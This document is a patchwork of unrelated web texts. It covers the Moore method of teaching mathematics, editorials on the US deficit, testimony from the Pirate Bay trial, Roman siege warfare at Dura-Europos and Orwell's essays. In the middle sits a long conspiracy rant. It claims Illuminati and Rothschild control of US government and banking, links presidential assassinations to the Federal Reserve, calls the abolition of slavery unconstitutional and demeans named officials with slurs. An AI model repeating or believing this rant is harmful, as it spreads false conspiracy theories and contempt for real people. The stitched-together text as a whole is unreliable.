( See also the Journal of Inquiry - Based Learning in Mathematics which publishes university - level course notes that are freely downloadable , professionally refereed , and classroom - tested . )
" These chapters are written in a very different style , which is motivated in part by the ideal of the Moore method of teaching topology combined with ideas of VIGRE programs in the US which advocate earlier introduction of seminar and research activities in the advanced undergraduate and graduate curricula " ( p. vi ) .
From the blurb : " Written in a modified R.L. Moore fashion , it offers a unique approach in which students construct their own understandings .
However , while students are called upon to write their own proofs , they are also encouraged to work in groups . "

" Those experienced in the Moore method , I believe , will appreciate and be able to use this book just on the basis of the first two chapters on set theory , but they write their own sets of notes for topology and wo n't need this one .
To those not experienced in the Moore method , I recommend this book as a means of introduction to the method and say , ' try it , you 'll like it . ' "
( R.R. FitzGerald , from review in Amer. Math . Monthly 79 ( 1972 ) , 920-921 . )
" The Moore Method is an idea with many fruitful aspects .
Let us not throw out the whole idea because it has some difficult points , rather let us search for a wider application of the good aspects .

Personal Experiences as Students and Teachers
" The evidence is clear that the discipline and rigor learned through [ the Moore method ] have lasting effects .
I can still remember the thrill of discovery and the triumph of presentation of a basic theorem as a freshman 47 years ago .
... I will fashion a course [ from the text ] in which I will include as many of the applications as possible , and on Fridays I will convert the class into a Moore method setting , with students proving theorems from a separate list I have generated . "
Vick , a professor at the University of Texas at Austin , is a third generation doctoral descendant of Moore .
“ We adopted a computer version , so to speak , of the famous R.L. Moore method of teaching .
...
It is easy to implement such a method in a computer framework .
A typical example would be a presentation of fifteen elementary statements about the geometrical relation of betweenness among three points .
Students are asked to select no more than five of the statements as axioms and to prove the rest as theorems ” ( p. 208 ) .
“ I have taught , or rather the students have taught themselves , a full syllabus of the course … using a small group discovery method .
…
In a sort of Moore method approach , the students are given examples to work out with guidance , a form of programmed prodding towards a solution . ” ( p. 85 )
" Before [ my husband John and I ] got interested in mathematics education as a research subject , we were mathematicians teaching at least some upper- division and graduate mathematics courses using the Moore Method . "
The author , professor of mathematics at the University of Birmingham in England , describes a first - year course , " Development of Mathematical Reasoning , " which has proven popular and effective for mathematics students entering the university .
" [ T ] he students learned the underlying mathematics of program derivation and learned to apply it , by presenting proofs and derivations on a daily basis .
Professorial intervention in the classroom was minimal .
Our experience has been that students learn otherwise difficult material better , and are better able to put it into practice , with this teaching technique than they would have been able to do in the typical classroom . "
“ One of us ( Barnett ) took courses taught using the method in the departments both of mathematics and of computer sciences while in Austin in the 1980s .
We describe the method as it was experienced at that time ” ( p. 85 ) .
" Avers ' instructional program parallels the work of the nationally known R.L. Moore of the University of Texas .
Both are able to get their students emotionally involved with their subject by taking away their textbooks . "

History
" Perhaps because of the distinctiveness of the teaching methods that Mooreâ€™s students had experienced in his classes , many of his students were active in educational issues .
Specifically , many of them became leaders in the MAA , participating actively in the educational issues of their day . "
A one - semester undergraduate course started by Bing at Wisconsin and continued by R.E. Fullerton , S.C. Kleene , and R.F. Williams .

Biography of Moore and His Students
Little had been known about Moore 's third PhD student Anna Mullikin ( 1922 ) who published only one research paper , her dissertation , and became a high school teacher .
This article sheds new light on her life and shows how influential her mathematics and her teaching were .
For a demonstration of Mullikin 's Nautilus , see Demo Collection .
Zettl describes his research but includes a brief biographical account of his family 's harrowing escape from a Yugoslavian concentration camp and eventual immigration to the US .
Thanks to the Moore Method used in classes that he took , he found his weak mathematics background to be no great disadvantage since he was on the same initial footing as everyone else .
Written during Dr. Moore ’s lifetime but not authorized by him , this account by a member of the Moore school of mathematics is a major resource for information about his life and career .
The author interviewed early students and colleagues .
Chapters by W. Bane and M. Jones list publications by Moore and his mathematical descendants .

His audio recordings of interviews with Anna Mullikin , Blanche Bennett Grove , F. Burton Jones , George Hallett , and others , can be accessed at the Archives of American Mathematics website
This is the most comprehensive biography to date and , in contrast to D. R. Traylor ’s 1972 account , it was able to make extensive use of Dr. Moore 's papers and the oral history resource in the Archives of American Mathematics
A principal research biostatistician with DuPont corporation talks about how he went from topology to statistics and " how Dr. Moore ’s influence continues in this new career . "
In the course of a challenging and politically sensitive research position Dr. Green shows how important qualities such as persistence , self - reliance , and clear thinking , as well as a sense of humor , have proven to be valuable lessons he took from Dr. Moore ’s classes .

The debate over the federal deficit has just entered scary , uncharted territory , said The Republican , a Massachusetts daily , in an editorial .
President - elect Barack Obama and the new Congress will be talking about a lot of proposals to avert economic disaster — and many of the things they hope to do are worthwhile .
But our leaders are now operating under the " very real cloud " of a projected $ 1 trillion deficit .
The economy is indeed " very sick , " said The Washington Post in an editorial , as Obama put it as he warned that the tax cuts and public spending needed to avert disaster would make such huge deficits necessary for the foreseeable future .
But at $ 775 billion over two years , Dr. Obama 's cure represents a " massive and risky expansion of the federal debt , " so Congress should proceed very , very cautiously .
That Congress plans to take until February to pass this massive new spending " constitutes a notable act of fiscal restraint in the Age of Obama , " said Rich Lowry in National Review Online .
Eventually , the stimulus will disappear and Americans will pay for Obama 's big spending with higher taxes .
Actually , said Martin Wolf in Financial Times , the real danger is that the stimulus proposed , at just 5.3 percent of GDP , wo n't be enough to shake the worst global financial crisis in seven decades .
Running a vast U.S. budget deficit is a temporary but necessary move , but the U.S. can't " deliver a durable return to growth " without the world 's help .

The Illuminati of course chose the people comprising Obama 's Cabinet , and they are the same red scum from the Clinton Administration who destroyed our economy with deregulation , and who destroyed our security by greatly reducing our military capacity while setting up the phony War on Terror .
And let 's not forget about the Clinton Administration 's War in Kosovo , which was set up to split Kosovo from Serbia , so that the CIA and MI6 could have an illicit drug gateway to Europe , an opium distribution center run by Islamic thugs that would oversee the trafficking in opium to be produced by the soon - to - be- conquered Afghanistan , whose government would be taken over by our Illuminist government after the Taliban were ejected in the aftermath of the 911 attacks .
And let 's certainly not forget the Dot.com Bubble that happened during their watch , where stocks of companies with web sites but no revenue or business plans were sold for fabulous fortunes by an unregulated Wall Street to unsuspecting Baby Boomers preparing for retirement .
The Nasdaq , once appropriately headed by Ponzi scum , Bernard Madoff , now stands at less than one third of its previous high , set almost a decade ago , and its collapse set the stage for the next bubbles , the real estate and OTC derivative bubbles , which now threaten to take down the world economy .
Between the Nasdaq and hedge fund scams , Madoff has left an unprecedented swath of destruction in his wake , and his activities were covered up by elitists and their puppet regulators in our corrupt government , who profited handsomely from his nefarious schemes and activities , many of whom were undoubtedly associated with the deregulatory denizens of the former Clinton Administration .
This new Cabinet of Fascist slime will become our new Central Planners under Obama as we nationalize our financial , insurance , auto and pharmaceutical / medical industries .
The new KGB , a/k / a Homeland Security , will be our Fascist enforcers while they set up a new domestic military force , and a military draft to provide it with the necessary manpower , to keep all their new " comrades , " a/k / a serfs , in line .
The new military draft will also provide cannon fodder , a/k / a our sons and daughters , to continually terrorize the people of other nations around the world with wars for profit for the fun and aggrandizement of our Illuminist military - industrial complex .
The new Gestapo will be headed by lesbian Janet Napolitano , now the former Governor of Arizona , a state that is completely overrun by illegal aliens .
But hey , let 's not let horrendous performance in the area of state and national security , especially along our borders , get in the way of filling in the new KGB employment gaps for our new Gestapo state , which is now really a corporatist , fascist police state , employing all the worst elements of both communism and fascism .
Hitler , Stalin and Mussolini would all be green with envy were they alive today .
As we have stated in the past , our country has been taken over by a bunch of Fascists and we mean that literally .
Fascist Comrade Obama plans to have ecumenicist , Rick Warren , swear him in on President Lincoln 's Bible .
This might seem encouraging at first , with Barack Obama symbolizing the first black presidential fruits of Lincoln 's efforts to free the slaves , until you realize that President Lincoln 's main objective at the start of the Civil War was the so - called preservation of the Union , not the emancipation of slaves .
It was about state rights versus the power of the federal government .
According to the Constitution , all rights are reserved to the states except for those specifically granted to the federal government by the US Constitution , and the Constitution did not originally address the issue of slavery , leaving it as an issue to be decided by each individual state .
Thus , forcing the abolition of slavery , regardless of its obvious ethical merits , on the states of the South , was , quite literally , unconstitutional .
This is really where the usurpation of states rights got started in earnest , and this process has resulted in the loss of much of our states ' sovereignty ever since as our Constitution continues to be ignored .
The enforcement of so - called separation of church and state by the federal government and the federal judiciary against the states is a perfect example of this , as is federal funding and regulation of a public school system for the education of our children .
Both issues involve the usurpation of states ' rights by the federal government .
Federal funding is often used as the nexus to obtain control over areas of power normally reserved to the states , which are continually impoverished , along with their citizens , by the inflationary policies of the Federal Reserve System , thus forcing them , by economic duress , to accept help from the US government , and all the regulation and red tape that goes with it .
Then our government miscreants just fire up the inflationary printing press , or invade the Social Security Ponzi Reserves , to provide the necessary funding , thus starting the next round of middle class inflationary pilferage , tax increases and financial duress , which leads to the next scheme to usurp state powers via federal funding which is needed by the states and their citizens on account of this ongoing economic extortion and financial terrorism .
Although Congress did not formally declare martial law in 1861 , Lincoln proposed martial law type legislation , including the suspension of the writ of habeas corpus , which Congress then passed , the Southern states having seceded from the US government , leaving the Northern states in charge .
This is not a good sign as we march toward our corporatist , fascist , Orwellian police state in the aftermath of Obama taking the oath for President of the US .
The oath he will take will require that he uphold the Constitution , but like a good little Illuminist bootlicker , he wo n't bite the hands that elected him , and he will ignore the Constitution totally .
He endorsed the view of Justice Kennedy that the Constitution is a " living instrument , " which is a euphemism for saying that you can change it and ignore it at will to create the UFSRA , United Fascist Socialist Republic of America .
According to Caligula , the current Illuminist puppet in the White House , the US Constitution is " just a piece of paper , " which is really just saying the same thing without the judicial flowery .
You might also note that the top tier Illuminist Rockefeller family , like Rick Warren , have a history of being ardent ecumenicists , as they are hell - bent on destroying Christianity and paving the way for a one - world religion as part of a one - world system of government which these sociopaths call the New World Order ( and which we often more appropriately refer to as the New World Disorder ) .
So Mr. Warren 's inclusion in the ceremony makes perfect sense from an Illuminist point of view .
Now many of our states face bankruptcy , and we shudder to think about what that implies for states ' rights and sovereignty in the event that they must be bailed out by the federal government .
The borrower is always a slave to the lender .
Will we see America broken up into regions , or see states secede again in the event we have a second Con-Con ( Constitutional Convention ) , where our glorious Constitution is scrapped for a new fascist Big Brother form of government ala George Orwell ?
Could this be why our Illuminist - run federal government is so reticent to help our states , allowing them to experience maximum failure so they can bring them to their knees later and dictate subservient terms for their bailout via the private Federal Reserve and the US Treasury 's hyperinflationary printing press and digital computer entries ?
We only need two more states to call a second Con-Con .
Will they wait until our nation disintegrates and then create Constitutional problems that beg for a resolution ?
You bet they will !
It is called the Hegelian Dialectic .
You can take that to the bank , if there are any left that are still solvent when we get to that point .
Or they may just declare martial law and do away with the US Constitution altogether on that basis .
Only time will tell .
Suffice it to say , we are headed toward the Civil War times all over again .
Hence the most likely reason for the use of Lincoln 's Bible .
The Illuminati love to use symbolism to announce their future plans .
Our largest state by population and economy , California , is by far the poorest run state in the union as it plunges toward bankruptcy and civil unrest at breakneck speed .
As the saying goes , you reap what you sow .
The immigrant son of a former Nazi is their Illuminist governor .
He was blessed by the Rothschild family , who are top tier Illuminists and the brains behind the evil Black Nobility of Europe , to play the role of governor to the world 's eighth largest economy .
California is a glaring microcosm of all the worst types of problems that exist in America , and is at the epicenter of the subprime fraud and real estate bubble .
The Option ARM scandal / debacle is also centered in the state of excess , California , a massive case of loan fraud that will administer the coup de grace to the US real estate market and that is also a fuse leading to the CDS ( credit default swap ) and IRS ( interest rate swap ) powder kegs at the heart of the Quadrillion Dollar Derivative Death - Star .
That Quadrillion Dollar Derivative Death - Star is a world - class disaster made possible by the same group of deregulatory Clintonites who now infest Comrade Obama 's Cabinet .
The new CCCP , the Clintonite Cabinet of fascist Parasites , with Queen Hillary as Secretary of State , is the same group of evil miscreants who were responsible for the totally irresponsible deregulation which did away with Glass - Steagall , which set up the unregulated OTC derivative market that powered the subprime , CDS and IRS derivatives debacles , and which ruined Fannie and Freddie with moronic loan qualification standards that were fraudulently not taken into account when valuing or rating derivatives .
The CCCP 's previous deregulation will now pave the way for total dictatorial regulation via a feudal , corporatist , fascist police state as large sectors of our economy are nationalized .
Get ready to fight , or to play the serf -- your choice .
Getting back to the Civil War , what you also do n't read about in the fane - stream press or in our Fascistic system of indoctrination and disinformation which some euphemistically refer to as our public education system , is that there were forces from Europe who were using the slavery issue to drive a wedge between the North and South , to divide and conquer America , and to take it back under the enslaving power of the British mercantilist system of European - style , debt - based fractional reserve banking , the specialty of the Rothschild family , top Illuminists and financiers of Europe 's Black Nobility , including the British throne , which never forgave our Founding Fathers for breaking away from their dark , choking grasp .
The War of 1812 was the first effort of the British Black Nobility , backed by the Rothschild banking family , to take back America and reclaim it as their economic slave - state , and they have not stopped ever since .
The First Bank of the United States , the so - called brainchild of Illuminist Alexander Hamilton ( but really of Baron Rothschild acting in the background ) , was a British Mercantilist , debt - based fractional reserve bank , which the British Black Nobility hoped to use to regain their economic dominance over their former colony .
The War of 1812 was started immediately after our US Congress , then run by real men with some chutzpah , refused to renew the charter of the First Bank of the United States in 1811 , having realized where this devious and nefarious system of stealth taxation was about to take them .
The ensuing British war efforts were funded by the Rothschild banking interests whose plans had been dashed by our admirable group of patriots in Congress , whose actions were in stark contrast to the leadership we get from the slimy , reprobate traitors who currently blacken the halls of our Capitol in Washington , D.C .
In any case , much to the dismay of the Illuminati , President Lincoln , during the Civil War , very wisely and bravely refused to finance the war using their private , debt - based fractional reserve banking system , which the Illuminati hoped to use to finance both sides of the war , thus ensuring maximum destruction for the later abject enslavement of America to their interests .
President Lincoln rightly opted to issue paper money directly from the treasury known as United States Notes , to fund the war , and steered clear of the interest bearing , debt - based fiat currencies of the fractional reserve bankers of the British mercantilist system .
The issuance of these United States Notes , on which no interest was due as they were not created to evidence interest bearing debts to private interests in the form of treasury bonds as is now the case with the Federal Reserve , were the direct obligations of the US government , thus avoiding the financial enslavement of interest payments .
The Fed now acts as our private British Mercantilist bankers , and it is owned by both US and European Illuminist interests , with the European interests being the same banking families and families of Black Nobility who have been attempting to retake America since the Revolutionary War , and who will stop at nothing to make America their oyster again .
For his insolence in rejecting the European bankers and their co-conspirators among the Black Nobility , President Lincoln was assassinated .
On June 4 , 1963 , President Kennedy attempted to do the same thing as President Lincoln with his Executive Order 11110 , that would have put the Fed out of business , and thus suffered a similar fate .
The assassinations of President 's Garfield and McKinley , as well as the attempted assassinations of Andrew Jackson , were all directly tied to their stand against private international bankers and their conspiracy to take over our financial system .
Will Barack Obama also go maverick on the Fed and risk assassination to save our nation ?
It would be nice to think so , but we doubt it .
On the other hand , if that 's why he is using Lincoln 's Bible , then we , of course , enthusiastically say : GO FOR IT !!!
After Obama swears on Lincoln 's Bible , he will use FDR's Illuminist playbook to try to save the economy , a playbook that was an abject failure when FDR used it , and that will produce the same results this time .
The objective is to spend as much money as possible , such that the elitists get paid their salaries , bonuses , dividends , stock options and golden parachutes , while the taxpayers of the US middle class get the shaft , as well as hyperinflation .
We wonder which Illuminist companies will reap all the benefits from the contracts for infrastructure , and who the foreign nations are that will purchase them with their ever - diminishing dollar reserves when they are completed ?
It will be just like the Iraq War , with no -bid contracts , outrageous cost overruns , substandard and incomplete work , slave labor by illegal immigrants instead of US citizens , as well as bribes of , and fraudulent inspections by , government flunkies .
Just the same old , same old , repackaged as infrastructure for a collapsing , dilapidated America , instead of a war - torn Iraq .
Funding will come from the hyperinflationary monetization of treasuries in mass quantities since tax increases are out of the question for now .
Those will come later , after the American middle class has been impoverished , as those who are lucky enough to still have jobs are taxed into oblivion , after having already been inflated into oblivion .
Americans should make a point to become well acquainted with the streets of financial oblivion , as that is where the Illuminati intend to send them on a regular basis .
And so it goes , ad nauseam .

It 's Day 8 of The Pirate Bay trial and several entertainment industry CEOs take the stand .
IFPI 's CEO John Kennedy said that TPB was an extremely damaging force on the global music industry and what the site offers is just too tempting for people to resist .
He also admitted to not understanding how TPB or even uTorrent works .
Today ’s first witness is Tobias Andersson from Piratbyrån and later on the IFPI ’s CEO John Kennedy will testify , although it ’s not expected that he will respond to the open letter and peace offering issued yesterday by the ‘ Kopimists ’ .
Also up , Bertil Sandgren , a board member of the Swedish film institute , Louis Werner of IFPI Sweden and Per Sundin ( CEO of Universal Music )
Tobias Andersson was briefly questioned about the speech Fredrik Neij ( TiAMO ) gave after the TPB raid in 2006 .
Andersson told the court that he wrote the speech for Neij , since speech writing is n’t Neij ’s thing .
Andersson ’s appearance was over in a few minutes and by 9:15 John Kennedy was testifying in English , through a Swedish translator .
IFPI ’s John Kennedy confirmed he was the CEO of IFPI and summarized his duties there , noting the group has 1500 members worldwide and it ’s main aims were to ‘ improve ’ copyright laws through government lobbying and fight piracy around the world since “ piracy has done immense damage to the music industry . ”
Kennedy says that IFPI takes up strategic litigation against various targets worldwide .
Kennedy said that for a long time the industry sold its product in physical form ( and experienced a limited piracy problem ) but with the advent of digital music this situation has grown worse , with some claiming that copyright did n’t even exist in the digital world .
He noted that the main sets of previous litigation were in the US ( Grokster ) and Australia ( Kazaa ) .
Kennedy then said how pleased the music industry was with the legal wins against these two companies and in the wake of their demise , The Pirate Bay took their chance to develop their business .
Kennedy said he first heard of TPB in 2004 and it was quickly becoming the # 1 source of illegal music and this was damaging to the industry .
Kennedy noted the transition to digital music was a great threat to them , and although more music is currently being consumed than ever before , “ less is being paid for than ever before . ”
If music is available for free , says Kennedy , many people find that temptation too much to resist and new business models can’t flourish .
The discussion then moved to the claim for damages .
Kennedy said the claims were “ justified and maybe even conservative , since the damage is immense . ”
Talk moved to the link between the cost of downloading legally and the claim for damages .
Kennedy said that for the industry , CDs were more profitable than digital downloads are today .
He said that artists , studio producers , songwriters , music publishers , studio staff and the marketing and promotion people all have get paid and the music industry spends more money than most other industries on R&D .
It invests 20 % of its revenue on finding new artists and although some suggest that this is n’t needed in the Internet age , they are wrong said Kennedy .
Kennedy went on to explain that music marketing is designed to take effect in “ Week One ” of an album ’s release and in an ideal world a new release would chart at # 1 and would reach its sales targets in that first week .
But if products are made available on Pirate Bay during that time he said , “ then purchases are taken out of the market and because of the illegal use of music , the legal use of music under - performs and in some countries that can have a dramatic effect . ”
Kennedy was asked about CD sales in the last 10 years .
He said they dropped from $ 27 billion to $ 18 billion .
He said that the Top 10 CDs in 2001 sold 69 million units and the Top 10 CDs in 2008 sold 46 million units .
9 years ago the # 1 record sold 13 million units but in 2008 , Coldplay sold half of that .
Kennedy was asked what impact legal downloads have on these figures , but he denied they made up the difference .
The music industry has always relied on young people for sales he said , and these same people have got used to using illegal sites .
“ Many legitimate sites have struggled to compete with free .
It ’s impossible to compete with free , ” said Kennedy .
When put to him that some claim that illegal downloading promotes sales , Kennedy labeled this as old - fashioned thinking and said that people do n’t think this way anymore .
When asked about P2P providing live performance promotion , Kennedy said that every single live performance success is linked to a previously successful recording career / sales .
When asked about the differences between TPB and Google , Kennedy said there is no comparison .
“ We talk to Google all the time about preventing piracy .
If you go to Google and type in Coldplay you get 40 million results – press stories , legal Coldplay music , review , appraisals of concerts / records .
If you go to Pirate Bay you will get less than 1000 results , all of which give you access to illegal music or videos .
Unfortunately The Pirate Bay does what it says in its description and its main aim is to make available unauthorized material .
It filters fake material , it authorizes , it induces . ”
Kennedy says TPB threat is growing all the time .
“ They are proud of this with their statistics – there are 22 million users , 1 million visitors each day , 1.6 million . torrent files and they say they are responsible for 55 % of BitTorrent traffic .
They pride themselves on the quality of what they deliver . ”
When questioned about the IFPI ’s 10X damages multiplier for pre-release material , Kennedy felt this was fair considering the damage it does to the launch of a product .
Kennedy says they have teams of experts monitoring the Internet everyday for piracy .
He went on to say that people who download music from TPB spend much less on music than they would otherwise and if they did n’t get it for free they would buy it .
“ It is common sense , if they could n’t get it for free they would buy it and when we ask them , they confirm that . ”
When asked if downloaders have less money than others , Kennedy said that younger people have the money but just do n’t spend it on music anymore .
Kennedy said that the reduction in sales in the music industry is directly attributable to illegal downloading .
When asked about scientific research on the issue , Kennedy said that of several reports , only one said there was no causal link between file - sharing and lost sales – all the rest say there is .
Discussion of certain reports on the issue took place , with defense lawyers questioning Kennedy on the details of the reports .
The defense lawyers pointed out that in one of the reports Kennedy refers to , lesser known artists appear to be downloaded a lot on TPB but Kennedy said although he is 56 years old , he recognizes nearly all of the artists in the TPB Top 100 list .
Carl Lundstrom ’s lawyer asked about the profit on the industry ’s $ 18bn turnover from 2008 .
“ Terrible , ” Kennedy replied .
Of the big players “ .. only one company is making a profit . ”
Kennedy was pushed , if he knows the turnover , why does n’t he know the profit .
He said it was difficult to say .
He was also asked how much of this $ 18bn turnover is used to fight piracy , Kennedy said there are three main areas of expenditure .
Funding the RIAA in US , IFPI globally and more local groups such as IFPI ( Sweden ) .
They all have budgets and a large proportion of this is used to fight piracy .
The global amount used by IFPI on lobbying and fighting piracy is £ 75 million .
Kennedy said he qualified as a lawyer since the 70’s but has n’t practiced recently .
He was asked if he understood BitTorrent .
Kennedy said he did , but in “ very vague terms . ”
When the defense lawyers asked more detailed questions , about uTorrent for instance , Kennedy said he ’d heard of it but had no idea of the details .
It was very clear he knew nothing about any remotely technical issues .
Kennedy was asked if IFPI has taken any action against the actual sharers of the music made available via TPB , as detailed in this case .
He said he could n’t say and did n’t know who these individuals are .
He then admitted to not knowing how The Pirate Bay works so the defense lawyers put it to him – if you do n’t understand how TPB works , how can you say they are to blame ?
Again he was pressed why he took no action against the actual sharers but he said he did n’t know and admitted “ It ’s probably unlikely we took action . ”
Kennedy was asked why they have n’t sued Google the same way as TPB .
He said that Google said they would partner IFPI in fighting piracy and he has a team of 10 people working with Google every day , and if Google had n’t announced they were a partner , IFPI would have sued them too .
When pressed on the earlier reports that Kennedy referred to , the defense lawyers wanted to know if IFPI had commissioned any of them .
Kennedy said he did n’t know .
The court then took a morning break .
After the break the hearings continued as Bertil Sandgren , a board member of the Swedish film institute took the stand .
He was asked to explain what he knows about file - sharing , and told the court that he knew that some movies leak on filesharing networks before they premiere , that there is no copy protection on these files and that there are even subtitles available .
The court then asked to keep the questions relevant to the damages that are claimed .
Sandgren went on to say that he believes that the impact of file - sharing on the movie industry started in 2002 / 2003 .
He claimed that there is statistical evidence that illegal file - sharing has affected the number of seats sold per film .
In Sweden , the ticket sales between 2002 - 2006 have fallen by 31 % , Sandgren explained .
“ The reason for this drop is that the number of premieres have increased but sales have decreased .
File - sharing has somewhat made the market thinner .
The difference between number of sold tickets on average has dropped 10,000 per film per year .
That equals between 800,000 and 1,000,000 SEK per film , ” Sandgren said .
Sandgren further told that the damages they claim are based on a fictitious license fee .
They have calculated the total number of movie downloads in a year , and use the film ’s market share ( 4 % for the movie “ Mastermind ” ) to come up with the total number of downloaders .
“ If there were 1 million downloaders in total , it ’s probable that 4 % downloaded Mastermind , ” Sandgren said .
“ Of those , 28,5 % were downloaded from TPB .
That gives 12000 . ”
After his explanation of how the damages are calculated , the defense lawyers questioned Sandgren .
Most of their questions focused on the link between downloading and the decline in ticket sales .
According to the defense lawyers there is research showing this link is not that straightforward , while stressing that 2008 has been the best year for the Swedish movie industry ever .
Sandgren said that he did n’t want to comment on factors underlying the success year .
Around noon the court took a lunch break .
After lunch Per Sundin , CEO of Universal Music and Louis Werner of IFPI Sweden were questioned .
Again , most questions dealt with the amount of damages the entertainment industry suffered , with the defense questioning whether the figures presented by the entertainment industry are justified .
Werner told how music sales declined in 2002 and 2003 , but as blogger Anna Troberg points out , IFPI ’s own data seems to contradict this statement .
Illegal file - sharing was the main reason of the loss in sales in recent years Werner stated .
When Per Sundin was asked whether the decline is sales could be fully attributed to illegal filesharing , he said yes .
Sundin went even further and claimed that 50 % of the loss in sales the music industry has suffered can be linked to The Pirate Bay .
He had to admit , however , that he has no evidence to back these claims up .
“ It is what they see and experience every day , ” Sundin said .
Pirate Bay ’s Peter Sunde and Universal Music CEO
Per Sundin bumped into each other after the hearings .
Peter just Twittered “ I just played the angry game with Per Sundin , Universal .
Always fun at #spectrial !
Oh , and I won of course . ”
Sunde vs. Sundin ( credit )
At 16:00 the court decided to end the hearings for today .
A researcher from the University of Leicester has identified what looks to be the oldest archaeological evidence for chemical warfare -- from Roman times .
At the meeting of the Archaeological Institute of America , University of Leicester archaeologist Simon James presented CSI - style arguments that about twenty Roman soldiers , found in a siege - mine at the city of Dura - Europos , Syria , met their deaths not as a result of sword or spear , but through asphyxiation .
Dura -Europos on the Euphrates was conquered by the Romans who installed a large garrison .
Around AD 256 , the city was subjected to a ferocious siege by an army from the powerful new Sasanian Persian empire .
The dramatic story is told entirely from archaeological remains ; no ancient text describes it .
Excavations during the 1920s - 30s , renewed in recent years , have resulted in spectacular and gruesome discoveries .
The Sasanians used the full range of ancient siege techniques to break into the city , including mining operations to breach the walls .
Roman defenders responded with ‘ counter - mines ’ to thwart the attackers .
In one of these narrow , low galleries , a pile of bodies , representing about twenty Roman soldiers still with their arms , was found in the 1930s .
While also conducting new fieldwork at the site , James has recently reappraised this coldest of cold - case ‘ crime scenes ’ , in an attempt to understand exactly how these Romans died , and came to be lying where they were found .
Dr James , Reader in the School of Archaeology and Ancient History at the University of Leicester , said : “ It is evident that , when mine and countermine met , the Romans lost the ensuing struggle .
Careful analysis of the disposition of the corpses shows they had been stacked at the mouth of the countermine by the Persians , using their victims to create a wall of bodies and shields , keeping Roman counterattack at bay while they set fire to the countermine , collapsing it , allowing the Persians to resume sapping the walls .
This explains why the bodies were where they were found .
But how did they die ?
For the Persians to kill twenty men in a space less than 2 m high or wide , and about 11 m long , required superhuman combat powers — or something more insidious . ”
Finds from the Roman tunnel revealed that the Persians used bitumen and sulphur crystals to get it burning .
These provided the vital clue .
When ignited , such materials give off dense clouds of choking gases .
“ The Persians will have heard the Romans tunnelling , ” says James , “ and prepared a nasty surprise for them .
I think the Sasanians placed braziers and bellows in their gallery , and when the Romans broke through , added the chemicals and pumped choking clouds into the Roman tunnel .
The Roman assault party were unconscious in seconds , dead in minutes .
Use of such smoke generators in siege - mines is actually mentioned in classical texts , and it is clear from the archaeological evidence at Dura that the Sasanian Persians were as knowledgeable in siege warfare as the Romans ; they surely knew of this grim tactic . ”
Ironically , this Persian mine failed to bring the walls down , but it is clear that the Sasanians somehow broke into the city .
James recently excavated a ‘ machine - gun belt ’ , a row of catapult bolts , ready to use by the wall of the Roman camp inside the city , representing the last stand of the garrison during the final street fighting .
The defenders and inhabitants were slaughtered or deported to Persia , the city abandoned forever , leaving its gruesome secrets undisturbed until modern archaeological research began to reveal them .
Ok , go sink your helo and fly back .

I 'm under firm editorial orders NOT to compare " Politics and the English Language " to any politician of any era or any stripe .
Now , this is no small stricture .
We revere Orwell for his views on big , abstract nouns like Fascism and Language , and rightly so .
Yet " Politics and the English Language " is only one of the 50 essays included in a new two - volume set of Orwell 's nonfiction , Facing Unpleasant Facts and All Art is Propaganda , compiled by George Packer and introduced by him and Keith Gessen .
In other words , Orwell wrote more than Animal Farm and Nineteen Eighty - Four , but he also wrote more than " Politics " and " Shooting an Elephant . "
After all , this was a man who wrote a gruff , loving , absurdly quotable essay of 62 pages on Charles Dickens .
( " Dickens had grown up near enough to poverty to be terrified of it . " )
But this was also a man who , four years earlier , wrote " Bookshop Memories , " where he observes " how completely " Dickens had " dropped out of favour . "
" Yet it is fairly easy to sell Dickens , " adds Orwell .
And this was a man , finally , who saw in these circumstances neither contradiction nor cause for sentimentality .
Orwell might draw a distinction between Great Expectations and " genuinely popular literature " — his example in the Dickens essay is actually an early production of Sweeney Todd , which " plagiarised quite shamelessly " from Sir Charles — but Orwell refuses to abandon either form .
In fact , he regularly engaged with and analyzed film , jazz , comic books , " good bad books , " and even some forms of pop culture now put out to pasture .
So , instead of the Orwell you know , here 's the Orwell you should .
2 .
We might as well start with the sentence you can't escape when tackling Orwell - the - writer .
In " Why I Write , " Orwell explains , " Every line of serious work that I have written since 1936 has been written , directly or indirectly , against totalitarianism and for democratic Socialism , as I understand it . "
Now , here Orwell moves more cautiously here than some will admit — this is certainly not the work of a " pamphleteer , " which is how Orwell describes himself in his preceding paragraph — but the rest of the essay still hits upon his chief concerns .
The force of pride and patriotism , the struggle between the upper and lower classes , the " message " behind any piece of writing : all appear in " Why I Write . "
As Orwell puts it earlier in the essay , " The opinion that art should have nothing to do with politics is itself a political attitude . "
What 's easy to overlook , though , is that Orwell held art to be as flexible a term as politics .
His relationship to pop culture meant more than a discussion of Dickens 's general appeal ; it meant more than gushing about Henry Miller 's Tropic of Cancer ( which Orwell did in " Inside the Whale " ) , and it meant more than reviewing Charlie Chaplin 's The Great Dictator ( which he did for a London newspaper ) .
It meant his personal experiences with these media , best captured in the " Narrative Essays , " as Packer classifies them , of Facing Unpleasant Facts .
" England Your England , " otherwise a rather dull entry in this volume , contains some of Orwell 's best theorizing on the subject .
" To an increasing extent , " he writes , " the rich and the poor read the same books , and they also see the same films and listen to the same radio programmes .
. . .
It is a rather restless , cultureless life , centring round tinned food , Picture Post , the radio and the internal combustion engine . "
If Orwell recognized the blandness of modern life , he knew that it still shaped and moved him .
In " My Country Right or Left , " he reflects on growing up during the Great War : " If I honestly sort out my memories and disregard what I have learned since , I must admit that nothing in the whole war moved me so deeply as the loss of the Titanic had done a few years earlier . "
Similar experiences occur throughout Orwell 's life , which means they occur throughout his writing .
Perhaps the best place to watch the adult Orwell reacting to pop culture is in Packer 's lengthy selection from Orwell 's diaries written during World War II .
At one point , Orwell undertakes " a rough analysis of advertisements in today 's issue of the People , " a Sunday paper which , according to his calculations , devoted a quarter of its pages to ads .
" Of 9 food and drink adverts . , 6 are for unnecessary luxuries .
Of 29 adverts .
for medicines , 19 are for things which are either fraudulent ( baldness cured etc. ) , more or less deleterious ( Kruschen Salts , Bile Beans etc. ) , or of the blackmail type ( ' Your child 's stomach needs magnesia ' ) . "
Orwell 's diaries , then , reveal an immersive , day - by - day interaction with pop culture , to the point that Orwell starts thinking in and through its terms .
He describes one stranger as " a regular comic - paper cartoon of a Jewess . "
Now , this is n't surprising .
Writing an experiential essay free from pop culture would mean blocking out a solid 80 percent of the surrounding stimuli , no matter how rarefied one 's station in life .
What is surprising , though , are Orwell 's attempts to apply his criticism to pop culture .
This , again , is a man who wrote a 62 - page essay on Dickens .
But this is also a man who wrote essays on trashy postcards and trashier magazines .
